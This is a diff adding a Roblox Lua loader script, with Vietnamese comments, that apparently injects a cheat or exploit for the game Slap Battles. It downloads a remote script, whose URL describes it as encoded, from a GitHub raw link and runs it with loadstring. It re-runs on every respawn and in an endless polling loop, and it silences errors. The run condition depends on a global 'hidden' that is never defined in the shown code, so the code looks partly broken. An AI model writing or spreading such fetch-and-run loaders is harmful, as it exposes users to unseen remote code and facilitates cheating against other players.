@@ -1,0 +1,36 @@
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+
+local SCRIPT_URL = "https://raw.githubusercontent.com/comedywencomedy-cpu/hsgssg/refs/heads/main/slap%20battle%20m%C3%A3%20ho%C3%A1"
+
+local isLoaded = false
+
+-- Hàm chạy script
+local function runScript()
+	if hidden == true and not isLoaded then
+		isLoaded = true
+		pcall(function()
+			loadstring(game:HttpGet(SCRIPT_URL))()
+		end)
+	end
+end
+
+-- Chạy lần đầu
+runScript()
+
+-- Khi nhân vật respawn (die xong sống lại)
+player.CharacterAdded:Connect(function()
+	isLoaded = false
+	task.wait(1)
+	runScript()
+end)
+
+-- Kiểm tra liên tục phòng trường hợp script chưa chạy
+task.spawn(function()
+	while true do
+		task.wait(2)
+		if hidden == true and not isLoaded then
+			runScript()
+		end
+	end
+end)
